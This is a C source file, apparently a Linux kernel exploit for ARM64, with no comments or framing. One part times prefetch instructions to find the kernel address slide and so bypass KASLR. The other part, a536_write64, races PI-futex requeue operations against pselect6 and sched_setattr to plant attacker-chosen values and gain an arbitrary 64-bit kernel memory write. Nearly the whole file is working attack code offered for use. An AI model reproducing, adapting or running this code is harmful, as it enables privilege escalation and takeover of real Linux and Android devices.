#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "target.h"

#define NFDS 320
#define FD_WORDS 5
#define SCHED_BATCH 3
#define PREFETCH_SAMPLES 32
#define PREFETCH_BURST 512
#define PREFETCH_SCAN_STEP 0x8000ULL
#define PREFETCH_EDGE_RUN 8
#define PREFETCH_REPEATS 3

static uint64_t init_task;
static uint64_t fake_lock;
static uint32_t f_wait;
static uint32_t f_target;
static uint32_t f_chain;
static atomic_int waiter_ready;
static atomic_int waiter_waiting;
static atomic_int owner_blocking;
static atomic_int deadlock_seen;
static atomic_int stamp_enter;
static atomic_int consume_done;
static atomic_int waiter_tid;
static uint64_t read_set[FD_WORDS];
static uint64_t write_set[FD_WORDS];
static uint64_t except_set[FD_WORDS];
static int log_fd = -1;
static int pipe_reader = -1;
static int pipe_writer = -1;
static int prefetch_soft_fail;

static _Noreturn void fail(const char *where) {
  int error = errno;

  dprintf(log_fd >= 0 ? log_fd : STDERR_FILENO, "FAIL %s errno=%d %s\n", where,
          error, strerror(error));
  _exit(1);
}

static void spin_until(atomic_int *value) {
  while (!atomic_load_explicit(value, memory_order_acquire))
    __asm__ volatile("yield");
}

static _Noreturn void hold(void) {
  for (;;)
    pause();
}

static void sleep_ms(long milliseconds) {
  struct timespec delay = {
      .tv_sec = milliseconds / 1000,
      .tv_nsec = milliseconds % 1000 * 1000000,
  };

  if (nanosleep(&delay, NULL))
    fail("nanosleep");
}

static inline uint64_t read_counter(void) {
  uint64_t value;

  __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb" : "=r"(value));
  return value;
}

static uint64_t measure_prefetch(uintptr_t address) {
  __asm__ volatile("dsb sy\n\tisb" ::: "memory");
  uint64_t started = read_counter();

  for (int index = 0; index < PREFETCH_BURST; index++)
    __asm__ volatile("prfm plil1keep, [%0]" : : "r"(address) : "memory");
  __asm__ volatile("dsb sy\n\tisb" ::: "memory");
  return read_counter() - started;
}

static int compare_u64(const void *left, const void *right) {
  uint64_t a = *(const uint64_t *)left;
  uint64_t b = *(const uint64_t *)right;

  return (a > b) - (a < b);
}

static uint64_t quantile(uintptr_t address) {
  uint64_t samples[PREFETCH_SAMPLES];

  for (size_t i = 0; i < PREFETCH_SAMPLES; ++i)
    samples[i] = measure_prefetch(address);
  qsort(samples, PREFETCH_SAMPLES, sizeof(samples[0]), compare_u64);
  return samples[3];
}

static void measure_triplet(uintptr_t candidate, uintptr_t mapped,
                            uintptr_t unmapped, uint64_t *candidate_q,
                            uint64_t *mapped_q, uint64_t *unmapped_q) {
  uint64_t candidate_samples[PREFETCH_SAMPLES];
  uint64_t mapped_samples[PREFETCH_SAMPLES];
  uint64_t unmapped_samples[PREFETCH_SAMPLES];

  for (size_t i = 0; i < PREFETCH_SAMPLES; ++i) {
    candidate_samples[i] = measure_prefetch(candidate);
    mapped_samples[i] = measure_prefetch(mapped);
    unmapped_samples[i] = measure_prefetch(unmapped);
  }
  qsort(candidate_samples, PREFETCH_SAMPLES, sizeof(candidate_samples[0]),
        compare_u64);
  qsort(mapped_samples, PREFETCH_SAMPLES, sizeof(mapped_samples[0]),
        compare_u64);
  qsort(unmapped_samples, PREFETCH_SAMPLES, sizeof(unmapped_samples[0]),
        compare_u64);
  *candidate_q = candidate_samples[3];
  *mapped_q = mapped_samples[3];
  *unmapped_q = unmapped_samples[3];
}

static uint64_t find_slide_once(void) {
  unsigned char *unmapped;
  uintptr_t mapped_address = (uintptr_t)&measure_prefetch;
  uintptr_t unmapped_address;
  uint64_t mapped_q;
  uint64_t unmapped_q;
  uint64_t edge = UINT64_MAX;
  unsigned high_run = 0;
  unsigned low_run = 0;

  unmapped = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (unmapped == MAP_FAILED)
    fail("prefetch mmap");
  unmapped_address = (uintptr_t)unmapped;
  if (munmap(unmapped, PAGE_SIZE))
    fail("prefetch munmap");
  mapped_q = quantile(mapped_address);
  unmapped_q = quantile(unmapped_address);
  if (unmapped_q <= mapped_q || unmapped_q - mapped_q < 8 ||
      unmapped_q - mapped_q < mapped_q / 2) {
    if (prefetch_soft_fail)
      return UINT64_MAX;
    errno = ENODATA;
    fail("prefetch controls");
  }

  for (uint64_t offset = 0; offset <= MAX_PHYSICAL_SLIDE;
       offset += PREFETCH_SCAN_STEP) {
    uint64_t candidate_q;
    uint64_t local_mapped;
    uint64_t local_unmapped;
    uint64_t threshold;

    measure_triplet(KIMAGE_TEXT_BASE + offset, mapped_address, unmapped_address,
                    &candidate_q, &local_mapped, &local_unmapped);
    if (local_unmapped <= local_mapped || local_unmapped - local_mapped < 8 ||
        local_unmapped - local_mapped < local_mapped / 2) {
      high_run = 0;
      low_run = 0;
      continue;
    }
    threshold = local_mapped + (local_unmapped - local_mapped) / 2;
    if (candidate_q > threshold) {
      low_run = 0;
      high_run =
          high_run < PREFETCH_EDGE_RUN ? high_run + 1 : PREFETCH_EDGE_RUN;
    } else if (high_run >= PREFETCH_EDGE_RUN) {
      if (!low_run)
        edge = offset;
      if (++low_run >= PREFETCH_EDGE_RUN)
        break;
    } else {
      high_run = 0;
    }
    if (offset > MAX_PHYSICAL_SLIDE - PREFETCH_SCAN_STEP)
      break;
  }
  return edge;
}

uint64_t a536_find_slide(void) {
  uint64_t values[PREFETCH_REPEATS];
  unsigned successful = 0;
  unsigned best_count = 0;
  uint64_t best = UINT64_MAX;
  cpu_set_t original_set;
  cpu_set_t set;

  if (sched_getaffinity(0, sizeof(original_set), &original_set))
    fail("get prefetch affinity");
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(0, sizeof(set), &set))
    fail("prefetch affinity");
  for (unsigned i = 0; i < PREFETCH_REPEATS; ++i) {
    unsigned count = 0;

    prefetch_soft_fail = 1;
    values[i] = find_slide_once();
    prefetch_soft_fail = 0;
    if (values[i] == UINT64_MAX)
      continue;
    successful++;
    for (unsigned prior = 0; prior <= i; ++prior)
      if (values[prior] == values[i])
        count++;
    if (count > best_count) {
      best_count = count;
      best = values[i];
    }
  }
  if (successful < 2 || best_count * 2 <= successful) {
    errno = EAGAIN;
    fail("prefetch consensus");
  }
  if (sched_setaffinity(0, sizeof(original_set), &original_set))
    fail("restore prefetch affinity");
  dprintf(STDERR_FILENO, "prefetch consensus=%#llx votes=%u/%u\n",
          (unsigned long long)best, best_count, successful);
  return best;
}

static void set_timeout(struct timespec *timeout, long milliseconds) {
  if (clock_gettime(CLOCK_MONOTONIC, timeout))
    fail("clock_gettime");
  timeout->tv_sec += milliseconds / 1000;
  timeout->tv_nsec += milliseconds % 1000 * 1000000;
  if (timeout->tv_nsec >= 1000000000) {
    timeout->tv_sec++;
    timeout->tv_nsec -= 1000000000;
  }
}

static long futex_call(uint32_t *first, int operation, uint32_t value,
                       uintptr_t timeout_or_count, uint32_t *second,
                       uint32_t compare) {
  return syscall(SYS_futex, first, operation, value, timeout_or_count, second,
                 compare);
}

static void setup_fds(void) {
  int pair[2];

  log_fd = fcntl(STDERR_FILENO, F_DUPFD_CLOEXEC, 500);
  if (log_fd < 0)
    fail("dup log fd");
  if (pipe2(pair, O_CLOEXEC))
    fail("pipe2");
  pipe_reader = pair[0];
  pipe_writer = fcntl(pair[1], F_DUPFD_CLOEXEC, 400);
  if (pipe_writer < 0)
    fail("dup pipe writer");
  for (int fd = 0; fd < NFDS; ++fd) {
    if (fd == pipe_reader)
      continue;
    if (dup3(pipe_reader, fd, O_CLOEXEC) != fd)
      fail("fill fd table");
  }
}

static void setup_stamp(uint64_t target, uint64_t value) {
  memset(read_set, 0, sizeof(read_set));
  memset(write_set, 0, sizeof(write_set));
  memset(except_set, 0, sizeof(except_set));
  write_set[1] = target - 8;
  write_set[2] = value;
  except_set[2] = init_task;
  except_set[3] = fake_lock;
}

static void *waiter_thread(void *unused) {
  struct timespec timeout;
  long result;
  int error;

  atomic_store_explicit(&waiter_tid, (int)syscall(SYS_gettid),
                        memory_order_release);
  if (futex_call(&f_chain, FUTEX_LOCK_PI, 0, 0, NULL, 0))
    fail("waiter lock");
  atomic_store_explicit(&waiter_ready, 1, memory_order_release);
  sleep_ms(20);
  set_timeout(&timeout, 2000);
  atomic_store_explicit(&waiter_waiting, 1, memory_order_release);
  errno = 0;
  result = futex_call(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, (uintptr_t)&timeout,
                      &f_target, 0);
  error = errno;
  spin_until(&deadlock_seen);
  dprintf(log_fd, "wait returned=%ld errno=%d\n", result, error);
  atomic_store_explicit(&stamp_enter, 1, memory_order_release);
  timeout.tv_sec = 2;
  timeout.tv_nsec = 0;
  errno = 0;
  result = syscall(SYS_pselect6, NFDS, read_set, write_set, except_set,
                   &timeout, NULL);
  dprintf(log_fd, "pselect returned=%ld errno=%d\n", result, errno);
  hold();
}

static void *owner_thread(void *unused) {
  if (futex_call(&f_target, FUTEX_LOCK_PI, 0, 0, NULL, 0))
    fail("owner target lock");
  spin_until(&waiter_ready);
  atomic_store_explicit(&owner_blocking, 1, memory_order_release);
  futex_call(&f_chain, FUTEX_LOCK_PI, 0, 0, NULL, 0);
  hold();
}

static void *consumer_thread(void *unused) {
  struct sched_attr attr = {
      .size = sizeof(attr),
      .sched_policy = SCHED_BATCH,
      .sched_nice = 19,
  };
  long result;
  int error;

  spin_until(&stamp_enter);
  sleep_ms(50);
  errno = 0;
  result = syscall(SYS_sched_setattr,
                   atomic_load_explicit(&waiter_tid, memory_order_acquire),
                   &attr, 0);
  error = errno;
  dprintf(log_fd, "sched_setattr returned=%ld errno=%d\n", result, error);
  atomic_store_explicit(&consume_done, 1, memory_order_release);
  hold();
}

_Noreturn void a536_write64(uint64_t slide, uint64_t target, uint64_t value,
                            uint64_t lock) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  long result;
  int error;

  setup_fds();
  init_task = INIT_TASK_BASE + slide;
  fake_lock = lock;
  setup_stamp(target, value);
  dprintf(log_fd,
          "start write slide=%#llx target=%#llx value=%#llx "
          "lock=%#llx task=%#llx\n",
          (unsigned long long)slide, (unsigned long long)target,
          (unsigned long long)value, (unsigned long long)fake_lock,
          (unsigned long long)init_task);
  if (pthread_create(&owner, NULL, owner_thread, NULL))
    fail("pthread owner");
  if (pthread_create(&consumer, NULL, consumer_thread, NULL))
    fail("pthread consumer");
  if (pthread_create(&waiter, NULL, waiter_thread, NULL))
    fail("pthread waiter");
  spin_until(&waiter_waiting);
  spin_until(&owner_blocking);
  sleep_ms(20);
  errno = 0;
  result = futex_call(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, 1, &f_target, 0);
  error = errno;
  dprintf(log_fd, "requeue returned=%ld errno=%d\n", result, error);
  atomic_store_explicit(&deadlock_seen, 1, memory_order_release);
  spin_until(&consume_done);
  dprintf(log_fd, "consume done; keep process live\n");
  hold();
}
